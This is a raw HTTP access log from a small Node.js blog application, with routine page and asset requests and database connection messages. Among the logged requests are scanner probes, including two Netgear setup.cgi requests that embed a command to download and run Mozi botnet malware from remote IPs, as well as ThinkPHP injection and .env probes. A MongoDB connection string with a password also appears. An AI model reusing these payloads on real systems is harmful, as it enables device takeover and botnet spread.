[0mGET / [36m304 [0m10.448 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.450 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.473 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.724 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.421 ms - -[0m
[0mGET / [36m304 [0m1.182 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.492 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.401 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.275 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.312 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.295 ms - -[0m
[0mGET /blogList [36m304 [0m2.372 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.504 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.598 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.588 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.593 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.587 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.305 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.881 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.865 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.166 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.164 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.140 ms - -[0m
[0mGET / [36m304 [0m0.930 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.463 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.456 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.436 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.371 ms - -[0m
Port 3000 is already in use
[0mGET / [36m304 [0m1.271 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.404 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.374 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.161 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.159 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.138 ms - -[0m
Port 3000 is already in use
[0mGET / [36m304 [0m2.062 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.494 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.358 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.191 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.223 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.210 ms - -[0m
[0mGET / [36m304 [0m1.029 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.428 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.479 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.478 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.438 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.437 ms - -[0m
[0mGET / [36m304 [0m0.998 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.440 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.369 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.082 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.157 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.197 ms - -[0m
[0mGET /blogList [36m304 [0m1.110 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.783 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.787 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.327 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.760 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.721 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.146 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.156 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.134 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.075 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.385 ms - -[0m
[0mGET / [36m304 [0m0.952 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.427 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.066 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.058 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.046 ms - -[0m
[0mGET / [32m200 [0m1.067 ms - 1971[0m
[0mGET /stylesheets/style.css [32m200 [0m1.684 ms - 493[0m
[0mGET /javascripts/jquery.min.js [32m200 [0m1.677 ms - 72380[0m
[0mGET /javascripts/popper.min.js [32m200 [0m1.237 ms - 21233[0m
[0mGET /javascripts/bootstrap.min.js [32m200 [0m1.078 ms - 60044[0m
[0mGET /stylesheets/bootstrap.min.css [32m200 [0m3.948 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.773 ms - 963[0m
[0mGET /blogAdd [32m200 [0m0.992 ms - 1918[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.466 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.186 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.166 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.156 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.335 ms - -[0m
[0mGET /blogList [32m200 [0m1.970 ms - 1914[0m
[0mGET /stylesheets/style.css [36m304 [0m0.453 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.453 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.464 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.489 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.471 ms - -[0m
[0mGET / [36m304 [0m0.961 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.469 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m4.179 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m4.174 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m4.156 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.553 ms - -[0m
[0mGET / [32m200 [0m0.939 ms - 1971[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m2.138 ms - 963[0m
[0mGET / [32m200 [0m0.900 ms - 1971[0m
[0mGET / [32m200 [0m0.877 ms - 1971[0m
[0mGET / [32m200 [0m0.928 ms - 1971[0m
[0mHEAD /robots.txt [33m404 [0m0.948 ms - 963[0m
[0mGET / [32m200 [0m0.921 ms - 1971[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m18.665 ms - 963[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.988 ms - 963[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.534 ms - 963[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.933 ms - 963[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.944 ms - 963[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.928 ms - 963[0m
[0mGET /t [33m404 [0m0.992 ms - 963[0m
[0mGET / [32m200 [0m0.895 ms - 1971[0m
[0mGET / [32m200 [0m0.703 ms - 1971[0m
[0mGET http://example.com/ [32m200 [0m0.946 ms - 1971[0m
[0mGET / [32m200 [0m1.614 ms - 1971[0m
[0mGET / [32m200 [0m0.928 ms - 1971[0m
[0mGET / [32m200 [0m0.866 ms - 1971[0m
[0mGET /ReportServer [33m404 [0m0.940 ms - 963[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.926 ms - 963[0m
[0mGET / [32m200 [0m0.918 ms - 1971[0m
[0mGET / [32m200 [0m0.859 ms - 1971[0m
[0mGET / [32m200 [0m0.955 ms - 1971[0m
[0mGET / [32m200 [0m0.707 ms - 1971[0m
[0mGET /app/.env [33m404 [0m0.846 ms - 963[0m
[0mPOST /app [33m404 [0m25.428 ms - 963[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.99.207.85:46136/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.966 ms - 963[0m
[0mGET /hudson [33m404 [0m1.949 ms - 963[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.948 ms - 963[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.961 ms - 963[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.855 ms - 1971[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.895 ms - 1971[0m
[0mGET / [32m200 [0m0.828 ms - 1971[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.927 ms - 963[0m
[0mHEAD /MjZL [33m404 [0m0.947 ms - 963[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://121.61.97.132:51112/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.993 ms - 963[0m
[0mGET / [32m200 [0m0.901 ms - 1971[0m
[0mGET / [32m200 [0m0.865 ms - 1971[0m
[0mHEAD / [32m200 [0m0.833 ms - 1971[0m
[0mGET / [32m200 [0m1.015 ms - 1971[0m
(node:23487) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Port 3000 is already in use
(node:23594) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:1604@localhost/blogger
[0mGET /blogAdd [36m304 [0m10.080 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.333 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.445 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.152 ms - 1498[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.399 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.409 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.418 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.170 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.528 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.811 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.841 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m3.671 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.692 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.363 ms - -[0m
[0mGET / [36m304 [0m1.408 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.495 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.410 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.168 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.173 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.191 ms - -[0m
[0mGET / [36m304 [0m1.195 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.508 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.589 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.578 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.548 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.506 ms - -[0m
[0mGET /blogList [36m304 [0m1.455 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.423 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.097 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.118 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.123 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.342 ms - -[0m
[0mGET / [36m304 [0m1.062 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.440 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.311 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.228 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.241 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.411 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.966 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.477 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.795 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.388 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.712 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.721 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.401 ms - -[0m
[0mGET /blogList [36m304 [0m1.251 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.461 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.349 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.080 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.085 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.078 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.925 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.496 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.114 ms - 1498[0m
[0mGET /stylesheets/style.css [36m304 [0m2.229 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.250 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.219 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.358 ms - -[0m
[0mGET / [36m304 [0m0.975 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.439 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.374 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.078 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.085 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.063 ms - -[0m
[0mGET / [36m304 [0m0.910 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.392 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.385 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.373 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.343 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.361 ms - -[0m
[0mGET / [36m304 [0m0.960 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.484 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.737 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.728 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.736 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.728 ms - -[0m
[0mGET /blogList [36m304 [0m1.066 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.495 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.431 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.437 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.479 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.513 ms - -[0m
[0mGET / [36m304 [0m0.905 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.386 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.495 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.489 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.470 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.475 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.922 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.438 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.786 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.387 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.750 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.749 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m2.903 ms - -[0m
[0mGET / [36m304 [0m0.921 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.992 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m2.939 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.931 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.912 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.918 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.902 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.449 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.428 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.031 ms - 1498[0m
[0mGET /stylesheets/style.css [36m304 [0m2.107 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.134 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.330 ms - -[0m
[0mGET / [36m304 [0m1.509 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.419 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.351 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.412 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.655 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.655 ms - -[0m
[0mGET / [36m304 [0m0.896 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.469 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.326 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.377 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.332 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.357 ms - -[0m
[0mGET /blogList [36m304 [0m1.686 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.440 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.330 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.707 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.690 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.323 ms - -[0m
[0mGET / [36m304 [0m0.875 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.434 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.660 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.635 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.310 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.309 ms - -[0m
[0mGET / [36m304 [0m0.946 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.425 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.330 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.017 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.980 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.946 ms - -[0m
[0mGET / [36m304 [0m0.876 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.449 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.339 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.314 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.285 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.257 ms - -[0m
[0mGET / [36m304 [0m0.897 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.431 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.339 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.454 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.340 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.356 ms - -[0m
[0mGET / [36m304 [0m0.876 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.449 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.360 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.096 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.078 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.063 ms - -[0m
[0mGET / [32m200 [0m0.922 ms - 1970[0m
[0mGET /stylesheets/style.css [32m200 [0m1.079 ms - 496[0m
[0mGET /javascripts/jquery.min.js [32m200 [0m1.635 ms - 72380[0m
[0mGET /javascripts/popper.min.js [32m200 [0m3.708 ms - 21233[0m
[0mGET /javascripts/bootstrap.min.js [32m200 [0m3.826 ms - 60044[0m
[0mGET /stylesheets/bootstrap.min.css [32m200 [0m3.942 ms - 160302[0m
[0mGET / [32m200 [0m0.799 ms - 1970[0m
[0mGET /stylesheets/style.css [32m200 [0m0.617 ms - 496[0m
[0mGET /blogAdd [32m200 [0m2.249 ms - 1984[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.445 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.897 ms - 1498[0m
[0mGET /stylesheets/style.css [36m304 [0m0.982 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.956 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.929 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.422 ms - -[0m
[0mGET / [36m304 [0m0.869 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.436 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.351 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.341 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.312 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.284 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.876 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.423 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.503 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.967 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.999 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.996 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.307 ms - -[0m
[0mGET / [36m304 [0m0.753 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [32m200 [0m0.605 ms - 60044[0m
[0mGET /stylesheets/style.css [36m304 [0m0.424 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.359 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.336 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.308 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.239 ms - -[0m
[0mGET /blogAdd [36m304 [0m5.854 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.479 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.613 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.194 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.214 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.194 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m2.188 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.890 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.376 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.206 ms - 1498[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.241 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m2.231 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m2.219 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m2.227 ms - -[0m
[0mGET /blogList [32m200 [0m1.037 ms - 4559[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.537 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.278 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.263 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.273 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.263 ms - -[0m
[0mGET /blogEdit [32m200 [0m1.601 ms - 1787[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.006 ms - 1498[0m
[0mGET /stylesheets/style.css [36m304 [0m1.566 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.549 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.532 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.510 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.496 ms - -[0m
[0mGET /blogList [36m304 [0m0.975 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.412 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.747 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.709 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.618 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.588 ms - -[0m
[0mGET /blogAdd [36m304 [0m0.850 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.375 ms - -[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.528 ms - 1498[0m
[0mGET /stylesheets/style.css [36m304 [0m1.527 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.516 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.290 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.360 ms - -[0m
[0mGET /javascripts/jquery.min.js [32m200 [0m0.589 ms - 72380[0m
[0mGET /blogList [36m304 [0m0.922 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.348 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.292 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.291 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.296 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.288 ms - -[0m
[0mGET /javascripts/popper.min.js [32m200 [0m0.600 ms - 21233[0m
[0mGET / [36m304 [0m0.915 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.349 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.293 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.268 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.274 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.266 ms - -[0m
(node:17886) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:1604@localhost/blogger
[0mGET /api/blogs [32m200 [0m27.992 ms - 244[0m
[0mGET /blogList [36m304 [0m50.140 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.885 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.797 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.428 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.872 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.662 ms - -[0m
[0mGET / [36m304 [0m1.417 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.513 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m3.481 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m3.522 ms - -[0m
